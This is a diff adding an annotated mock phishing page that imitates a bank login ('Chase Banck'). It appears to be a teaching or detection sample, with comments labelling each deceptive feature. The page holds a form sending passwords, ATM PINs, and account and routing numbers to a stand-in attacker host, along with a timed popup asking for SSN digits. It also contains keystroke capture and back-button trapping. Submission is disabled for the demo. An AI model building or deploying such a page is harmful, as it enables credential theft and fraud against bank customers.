@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- PHISHING INDICATOR: Generic bank name, misspelling -->
+    <title>Chase Banck - Secure Online Banking | Update Required</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+        }
+        /* PHISHING INDICATOR: Mimicking legitimate bank header */
+        .header {
+            background: linear-gradient(to right, #0a4d8c, #1a75c4);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header h1 {
+            color: white;
+            font-size: 28px;
+        }
+        .header-links a {
+            color: white;
+            text-decoration: none;
+            margin-left: 20px;
+            font-size: 14px;
+        }
+        .main-content {
+            max-width: 900px;
+            margin: 40px auto;
+            display: flex;
+            gap: 30px;
+            padding: 0 20px;
+        }
+        .login-box {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            flex: 1;
+        }
+        .info-box {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            flex: 1;
+        }
+        h2 {
+            color: #0a4d8c;
+            margin-bottom: 20px;
+            font-size: 20px;
+        }
+        /* PHISHING INDICATOR: Alarming security alert */
+        .security-alert {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-left: 4px solid #ff5722;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        .security-alert h3 {
+            color: #d32f2f;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        .security-alert p {
+            font-size: 13px;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #333;
+            font-weight: bold;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #0a4d8c;
+        }
+        .btn-signin {
+            width: 100%;
+            padding: 14px;
+            background: #0a4d8c;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn-signin:hover {
+            background: #083a6a;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            margin-bottom: 15px;
+        }
+        .help-links {
+            margin-top: 20px;
+            font-size: 13px;
+        }
+        .help-links a {
+            color: #0a4d8c;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 8px;
+        }
+        /* PHISHING INDICATOR: Fake promotional content */
+        .promo-item {
+            padding: 15px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .promo-item:last-child {
+            border-bottom: none;
+        }
+        .promo-item h4 {
+            color: #0a4d8c;
+            margin-bottom: 5px;
+        }
+        .promo-item p {
+            font-size: 13px;
+            color: #666;
+        }
+        /* PHISHING INDICATOR: Fake footer with legitimate-looking info */
+        .footer {
+            background: #333;
+            color: white;
+            padding: 30px;
+            margin-top: 50px;
+        }
+        .footer-content {
+            max-width: 900px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+        }
+        .footer a {
+            color: #aaa;
+            text-decoration: none;
+        }
+        /* PHISHING INDICATOR: Deceptive trust indicators */
+        .trust-badges {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            justify-content: center;
+        }
+        .trust-badge {
+            background: #e8f5e9;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            color: #2e7d32;
+        }
+        /* PHISHING INDICATOR: Popup overlay to capture more data */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .overlay.active {
+            display: flex;
+        }
+        .popup {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 400px;
+            text-align: center;
+        }
+        .popup h3 {
+            color: #d32f2f;
+            margin-bottom: 15px;
+        }
+        .popup input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .popup button {
+            background: #0a4d8c;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <!-- PHISHING INDICATOR: Fake bank header -->
+    <div class="header">
+        <h1>Chase Banck</h1>
+        <div class="header-links">
+            <a href="#">Personal</a>
+            <a href="#">Business</a>
+            <a href="#">Commercial</a>
+            <a href="#">About Us</a>
+        </div>
+    </div>
+    
+    <div class="main-content">
+        <div class="login-box">
+            <h2>Sign In to Online Banking</h2>
+            
+            <!-- PHISHING INDICATOR: Urgent security warning -->
+            <div class="security-alert">
+                <h3>⚠️ SECURITY ALERT</h3>
+                <p>We've detected unusual activity on your account. Please verify your identity immediately to prevent account suspension. Your account access may be limited until verification is complete.</p>
+            </div>
+            
+            <!-- PHISHING INDICATOR: Form collecting excessive sensitive data -->
+            <form action="http://malicious-site.example.com/steal.php" method="POST" id="bank-form">
+                <div class="form-group">
+                    <label>User ID</label>
+                    <input type="text" name="user_id" placeholder="Enter User ID" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" name="password" placeholder="Enter Password" required>
+                </div>
+                
+                <!-- PHISHING INDICATOR: Asking for PIN at login -->
+                <div class="form-group">
+                    <label>ATM PIN (Required for Verification)</label>
+                    <input type="password" name="atm_pin" placeholder="4-digit PIN" maxlength="4" required>
+                </div>
+                
+                <!-- PHISHING INDICATOR: Asking for account number -->
+                <div class="form-group">
+                    <label>Account Number</label>
+                    <input type="text" name="account_number" placeholder="Enter Account Number" required>
+                </div>
+                
+                <!-- PHISHING INDICATOR: Asking for routing number -->
+                <div class="form-group">
+                    <label>Routing Number</label>
+                    <input type="text" name="routing_number" placeholder="9-digit Routing Number" required>
+                </div>
+                
+                <div class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Remember this computer</label>
+                </div>
+                
+                <button type="submit" class="btn-signin">Sign In Securely</button>
+                
+                <!-- PHISHING INDICATOR: Fake trust badges -->
+                <div class="trust-badges">
+                    <span class="trust-badge">🔒 SSL Secured</span>
+                    <span class="trust-badge">✓ FDIC Insured</span>
+                    <span class="trust-badge">🛡️ Bank-Level Security</span>
+                </div>
+            </form>
+            
+            <div class="help-links">
+                <a href="#">Forgot User ID/Password?</a>
+                <a href="#">Enroll in Online Banking</a>
+                <a href="#">Security Center</a>
+            </div>
+        </div>
+        
+        <div class="info-box">
+            <h2>Important Updates</h2>
+            
+            <div class="promo-item">
+                <h4>🔐 Enhanced Security Measures</h4>
+                <p>We're updating our security protocols. All users must re-verify their accounts by providing complete information.</p>
+            </div>
+            
+            <div class="promo-item">
+                <h4>💳 New Credit Card Offers</h4>
+                <p>Earn unlimited 2% cash back on all purchases. Apply today!</p>
+            </div>
+            
+            <div class="promo-item">
+                <h4>📱 Mobile Banking App</h4>
+                <p>Bank on the go with our award-winning mobile app. Download now!</p>
+            </div>
+            
+            <div class="promo-item">
+                <h4>🏠 Home Loan Rates</h4>
+                <p>Lock in historically low rates. Get pre-approved in minutes.</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- PHISHING INDICATOR: Popup asking for additional verification -->
+    <div class="overlay" id="verification-popup">
+        <div class="popup">
+            <h3>Additional Verification Required</h3>
+            <p style="margin-bottom: 15px; font-size: 14px;">For your security, please provide your mother's maiden name and the last 4 digits of your SSN.</p>
+            <input type="text" name="maiden_name" placeholder="Mother's Maiden Name">
+            <input type="text" name="ssn_last4" placeholder="Last 4 of SSN">
+            <input type="text" name="dob" placeholder="Date of Birth (MM/DD/YYYY)">
+            <button onclick="closePopup()">Verify Identity</button>
+        </div>
+    </div>
+    
+    <!-- PHISHING INDICATOR: Fake footer mimicking legitimate bank -->
+    <div class="footer">
+        <div class="footer-content">
+            <div>
+                <p>© 2024 Chase Banck. All rights reserved.</p>
+                <p style="margin-top: 5px;"><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a> | <a href="#">Security</a></p>
+            </div>
+            <div>
+                <p>Member FDIC | Equal Housing Lender</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // PHISHING INDICATOR: Show popup after delay to capture more data
+        setTimeout(() => {
+            document.getElementById('verification-popup').classList.add('active');
+        }, 5000);
+        
+        function closePopup() {
+            document.getElementById('verification-popup').classList.remove('active');
+        }
+        
+        // Prevent actual form submission for demo
+        document.getElementById('bank-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('DEMO: This is a test phishing page. In a real attack, your banking credentials would be stolen.');
+        });
+        
+        // PHISHING INDICATOR: Capture keystrokes
+        document.addEventListener('keydown', function(e) {
+            // In a real phishing attack, keystrokes would be logged and sent to attacker
+            console.log('Key captured:', e.key);
+        });
+        
+        // PHISHING INDICATOR: Block browser back button
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+    </script>
+</body>
+</html>
+
